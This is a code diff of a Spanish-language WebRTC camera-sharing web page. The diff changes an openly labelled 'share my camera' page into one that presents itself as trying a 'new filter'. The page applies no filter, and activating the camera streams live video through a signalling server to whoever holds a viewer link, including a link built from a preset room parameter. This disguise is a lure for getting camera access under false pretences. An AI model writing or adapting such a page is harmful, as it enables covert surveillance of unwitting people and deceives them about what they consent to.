@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cámara de amigos</title>
+  <title>Nuevo filtro</title>
 
   <style>
     body {
@@ -29,6 +29,7 @@
       border: 0;
       border-radius: 12px;
       font-size: 16px;
+      cursor: pointer;
     }
 
     #shareBtn {
@@ -59,8 +60,18 @@
       word-break: break-all;
     }
 
-    #status {
+    #shareLink {
+      display: block;
+      margin-top: 10px;
+    }
+
+    #shareStatus {
       margin-top: 15px;
+      font-weight: bold;
+    }
+
+    #viewMode {
+      display: none;
     }
   </style>
 </head>
@@ -69,65 +80,176 @@
 
 <div class="box">
 
-  <h1>😎 Cámara de amigos</h1>
+  <h1>✨ Probá el nuevo filtro</h1>
 
   <div id="shareMode">
-    <p>
-      Si querés compartir tu cámara, tocá el botón y
-      aceptá el permiso del navegador.
+
+    <p id="introText">
+      Activá tu cámara para probar el nuevo filtro.
     </p>
 
-    <button id="shareBtn">📷 Compartir mi cámara</button>
-    <button id="stopBtn">⛔ Dejar de compartir</button>
+    <button id="shareBtn">
+      📷 Activar cámara y probar filtro
+    </button>
 
     <div id="linkBox">
-      <p>🔗 Mandale este enlace a la persona que va a ver tu cámara:</p>
+
+      <p>
+        🔗 <strong>Antes de abrir la cámara y probar el filtro,
+        enviále este enlace a tu amigo.</strong>
+      </p>
+
       <strong id="shareLink"></strong>
+
     </div>
 
-    <p id="shareStatus">Cámara sin activar.</p>
+    <p id="shareStatus">
+      Cámara sin activar.
+    </p>
 
-    <video id="localVideo" autoplay playsinline muted></video>
+    <video
+      id="localVideo"
+      autoplay
+      playsinline
+      muted>
+    </video>
+
+    <button id="stopBtn">
+      ⛔ Dejar de compartir
+    </button>
+
   </div>
 
-  <div id="viewMode" style="display:none">
+
+  <div id="viewMode">
 
     <h2>📺 Cámara del amigo</h2>
 
-    <p id="viewStatus">Esperando conexión...</p>
+    <p id="viewStatus">
+      Esperando conexión...
+    </p>
 
-    <video id="remoteVideo" autoplay playsinline controls></video>
+    <video
+      id="remoteVideo"
+      autoplay
+      playsinline>
+    </video>
 
   </div>
 
 </div>
 
+
 <script>
 
 const SERVER = "wss://camara-03m8.onrender.com";
 
-const params = new URLSearchParams(window.location.search);
+const params =
+  new URLSearchParams(window.location.search);
+
 const mode = params.get("mode");
 const room = params.get("room");
 
-const shareMode = document.getElementById("shareMode");
-const viewMode = document.getElementById("viewMode");
+const shareMode =
+  document.getElementById("shareMode");
 
-const shareBtn = document.getElementById("shareBtn");
-const stopBtn = document.getElementById("stopBtn");
+const viewMode =
+  document.getElementById("viewMode");
 
-const localVideo = document.getElementById("localVideo");
-const remoteVideo = document.getElementById("remoteVideo");
+const shareBtn =
+  document.getElementById("shareBtn");
 
-const shareStatus = document.getElementById("shareStatus");
-const viewStatus = document.getElementById("viewStatus");
+const stopBtn =
+  document.getElementById("stopBtn");
 
-const linkBox = document.getElementById("linkBox");
-const shareLink = document.getElementById("shareLink");
+const localVideo =
+  document.getElementById("localVideo");
 
-let socket;
-let peer;
+const remoteVideo =
+  document.getElementById("remoteVideo");
+
+const shareStatus =
+  document.getElementById("shareStatus");
+
+const viewStatus =
+  document.getElementById("viewStatus");
+
+const linkBox =
+  document.getElementById("linkBox");
+
+const shareLink =
+  document.getElementById("shareLink");
+
+let socket = null;
+let peer = null;
 let localStream = null;
+let pendingCandidates = [];
+
+
+/* =========================
+   WEBRTC
+========================= */
+
+function createPeer() {
+
+  peer = new RTCPeerConnection({
+
+    iceServers: [
+      {
+        urls: "stun:stun.l.google.com:19302"
+      }
+    ]
+
+  });
+
+
+  if (localStream) {
+
+    localStream
+      .getTracks()
+      .forEach(track => {
+
+        peer.addTrack(
+          track,
+          localStream
+        );
+
+      });
+
+  }
+
+
+  peer.onicecandidate = event => {
+
+    if (
+      event.candidate &&
+      socket &&
+      socket.readyState === WebSocket.OPEN
+    ) {
+
+      socket.send(JSON.stringify({
+
+        type: "candidate",
+        candidate: event.candidate
+
+      }));
+
+    }
+
+  };
+
+
+  peer.ontrack = event => {
+
+    remoteVideo.srcObject =
+      event.streams[0];
+
+    viewStatus.textContent =
+      "🟢 Cámara recibida.";
+
+  };
+
+}
 
 
 /* =========================
@@ -139,130 +261,263 @@ if (mode === "share" || !mode) {
   shareMode.style.display = "block";
   viewMode.style.display = "none";
 
-  const roomId = room || Math.random().toString(36).substring(2, 10);
 
-  shareBtn.addEventListener("click", async () => {
+  const roomId =
+    room ||
+    Math.random()
+      .toString(36)
+      .substring(2, 10);
 
-    try {
 
-      shareStatus.textContent = "🟡 Pidiendo permiso de cámara...";
+  shareBtn.addEventListener(
+    "click",
+    async () => {
 
-      localStream = await navigator.mediaDevices.getUserMedia({
-        video: true,
-        audio: false
-      });
-
-      localVideo.srcObject = localStream;
-
-      shareBtn.style.display = "none";
-      stopBtn.style.display = "inline-block";
-
-      shareStatus.textContent = "🟢 Cámara compartida.";
-
-      const viewerLink =
-        window.location.origin +
-        window.location.pathname +
-        "?mode=view&room=" +
-        encodeURIComponent(roomId);
-
-      shareLink.textContent = viewerLink;
-      linkBox.style.display = "block";
-
-      socket = new WebSocket(SERVER);
-
-      socket.onopen = () => {
-
-        socket.send(JSON.stringify({
-          type: "join",
-          room: roomId
-        }));
+      try {
 
         shareStatus.textContent =
-          "🟢 Cámara activa. Esperando al espectador...";
-      };
+          "🟡 Pidiendo permiso de cámara...";
 
-      socket.onmessage = async (event) => {
 
-        const message = JSON.parse(event.data);
+        localStream =
+          await navigator.mediaDevices
+          .getUserMedia({
 
-        if (message.type === "peer-joined") {
+            video: true,
+            audio: false
 
-          createPeer();
+          });
 
-          const offer = await peer.createOffer();
 
-          await peer.setLocalDescription(offer);
+        localVideo.srcObject =
+          localStream;
+
+
+        shareBtn.style.display =
+          "none";
+
+        stopBtn.style.display =
+          "inline-block";
+
+
+        shareStatus.textContent =
+          "🟢 Cámara activa — compartiendo";
+
+
+        const viewerLink =
+          window.location.origin +
+          window.location.pathname +
+          "?mode=view&room=" +
+          encodeURIComponent(roomId);
+
+
+        shareLink.textContent =
+          viewerLink;
+
+        linkBox.style.display =
+          "block";
+
+
+        socket =
+          new WebSocket(SERVER);
+
+
+        socket.onopen = () => {
 
           socket.send(JSON.stringify({
-            type: "offer",
-            offer: offer
+
+            type: "join",
+            room: roomId
+
           }));
-        }
 
-        if (message.type === "answer") {
 
-          await peer.setRemoteDescription(
-            new RTCSessionDescription(message.answer)
-          );
-        }
+          shareStatus.textContent =
+            "🟢 Cámara activa — compartiendo";
 
-        if (message.type === "candidate") {
+        };
 
-          if (peer) {
 
-            try {
-              await peer.addIceCandidate(
-                new RTCIceCandidate(message.candidate)
+        socket.onmessage =
+          async event => {
+
+            const message =
+              JSON.parse(event.data);
+
+
+            if (
+              message.type === "peer-joined"
+            ) {
+
+              if (peer) {
+
+                peer.close();
+
+              }
+
+              pendingCandidates = [];
+
+              createPeer();
+
+
+              const offer =
+                await peer.createOffer();
+
+
+              await peer.setLocalDescription(
+                offer
               );
-            } catch (error) {
-              console.log(error);
+
+
+              socket.send(JSON.stringify({
+
+                type: "offer",
+                offer: offer
+
+              }));
+
             }
 
-          }
-        }
 
-      };
+            if (
+              message.type === "answer"
+            ) {
 
-    } catch (error) {
+              await peer.setRemoteDescription(
 
-      console.error(error);
+                new RTCSessionDescription(
+                  message.answer
+                )
+
+              );
+
+
+              for (
+                const candidate
+                of pendingCandidates
+              ) {
+
+                try {
+
+                  await peer.addIceCandidate(
+                    candidate
+                  );
+
+                } catch (error) {
+
+                  console.log(error);
+
+                }
+
+              }
+
+              pendingCandidates = [];
+
+            }
+
+
+            if (
+              message.type === "candidate"
+            ) {
+
+              const candidate =
+                new RTCIceCandidate(
+                  message.candidate
+                );
+
+
+              if (
+                peer &&
+                peer.remoteDescription
+              ) {
+
+                try {
+
+                  await peer.addIceCandidate(
+                    candidate
+                  );
+
+                } catch (error) {
+
+                  console.log(error);
+
+                }
+
+              } else {
+
+                pendingCandidates.push(
+                  candidate
+                );
+
+              }
+
+            }
+
+          };
+
+      } catch (error) {
+
+        console.error(error);
+
+        shareStatus.textContent =
+          "🔴 No se concedió el permiso de cámara.";
+
+      }
+
+    }
+  );
+
+
+  stopBtn.addEventListener(
+    "click",
+    () => {
+
+      if (localStream) {
+
+        localStream
+          .getTracks()
+          .forEach(track => track.stop());
+
+        localStream = null;
+
+      }
+
+
+      if (peer) {
+
+        peer.close();
+        peer = null;
+
+      }
+
+
+      if (socket) {
+
+        socket.close();
+        socket = null;
+
+      }
+
+
+      localVideo.srcObject =
+        null;
+
 
       shareStatus.textContent =
-        "🔴 No se concedió el permiso de cámara.";
+        "⚫ Dejaste de compartir.";
+
+
+      stopBtn.style.display =
+        "none";
+
+      shareBtn.style.display =
+        "inline-block";
+
+      linkBox.style.display =
+        "none";
 
     }
-
-  });
-
-  stopBtn.addEventListener("click", () => {
-
-    if (localStream) {
-
-      localStream.getTracks().forEach(track => track.stop());
-      localStream = null;
-
-    }
-
-    if (peer) {
-      peer.close();
-      peer = null;
-    }
-
-    if (socket) {
-      socket.close();
-      socket = null;
-    }
-
-    localVideo.srcObject = null;
-
-    shareStatus.textContent = "⚫ Dejaste de compartir.";
-
-    stopBtn.style.display = "none";
-    shareBtn.style.display = "inline-block";
-
-    linkBox.style.display = "none";
-
-  });
+  );
 
 }
 
@@ -271,114 +526,144 @@ if (mode === "share" || !mode) {
    MODO VER
 ========================= */
 
-else if (mode === "view" && room) {
+else if (
+  mode === "view" &&
+  room
+) {
 
-  shareMode.style.display = "none";
-  viewMode.style.display = "block";
+  shareMode.style.display =
+    "none";
 
-  socket = new WebSocket(SERVER);
+  viewMode.style.display =
+    "block";
+
+
+  viewStatus.textContent =
+    "🟡 Conectando con la cámara...";
+
+
+  socket =
+    new WebSocket(SERVER);
+
 
   socket.onopen = () => {
 
-    viewStatus.textContent =
-      "🟡 Conectando con la cámara...";
-
     socket.send(JSON.stringify({
+
       type: "join",
       room: room
+
     }));
+
 
     createPeer();
 
   };
 
-  socket.onmessage = async (event) => {
 
-    const message = JSON.parse(event.data);
+  socket.onmessage =
+    async event => {
 
-    if (message.type === "offer") {
+      const message =
+        JSON.parse(event.data);
 
-      await peer.setRemoteDescription(
-        new RTCSessionDescription(message.offer)
-      );
 
-      const answer = await peer.createAnswer();
+      if (
+        message.type === "offer"
+      ) {
 
-      await peer.setLocalDescription(answer);
+        await peer.setRemoteDescription(
 
-      socket.send(JSON.stringify({
-        type: "answer",
-        answer: answer
-      }));
+          new RTCSessionDescription(
+            message.offer
+          )
 
-      viewStatus.textContent =
-        "🟢 Conectado. Recibiendo cámara...";
-    }
-
-    if (message.type === "candidate") {
-
-      try {
-
-        await peer.addIceCandidate(
-          new RTCIceCandidate(message.candidate)
         );
 
-      } catch (error) {
-        console.log(error);
+
+        const answer =
+          await peer.createAnswer();
+
+
+        await peer.setLocalDescription(
+          answer
+        );
+
+
+        socket.send(JSON.stringify({
+
+          type: "answer",
+          answer: answer
+
+        }));
+
+
+        for (
+          const candidate
+          of pendingCandidates
+        ) {
+
+          try {
+
+            await peer.addIceCandidate(
+              candidate
+            );
+
+          } catch (error) {
+
+            console.log(error);
+
+          }
+
+        }
+
+        pendingCandidates = [];
+
+
+        viewStatus.textContent =
+          "🟢 Conectado. Recibiendo cámara...";
+
       }
 
-    }
 
-  };
+      if (
+        message.type === "candidate"
+      ) {
 
-}
+        const candidate =
+          new RTCIceCandidate(
+            message.candidate
+          );
 
 
-/* =========================
-   WEBRTC
-========================= */
+        if (
+          peer &&
+          peer.remoteDescription
+        ) {
 
-function createPeer() {
+          try {
 
-  peer = new RTCPeerConnection({
-    iceServers: [
-      {
-        urls: "stun:stun.l.google.com:19302"
+            await peer.addIceCandidate(
+              candidate
+            );
+
+          } catch (error) {
+
+            console.log(error);
+
+          }
+
+        } else {
+
+          pendingCandidates.push(
+            candidate
+          );
+
+        }
+
       }
-    ]
-  });
 
-  if (localStream) {
-
-    localStream.getTracks().forEach(track => {
-
-      peer.addTrack(track, localStream);
-
-    });
-
-  }
-
-  peer.onicecandidate = (event) => {
-
-    if (event.candidate && socket) {
-
-      socket.send(JSON.stringify({
-        type: "candidate",
-        candidate: event.candidate
-      }));
-
-    }
-
-  };
-
-  peer.ontrack = (event) => {
-
-    remoteVideo.srcObject = event.streams[0];
-
-    viewStatus.textContent =
-      "🟢 Cámara recibida.";
-
-  };
+    };
 
 }
 
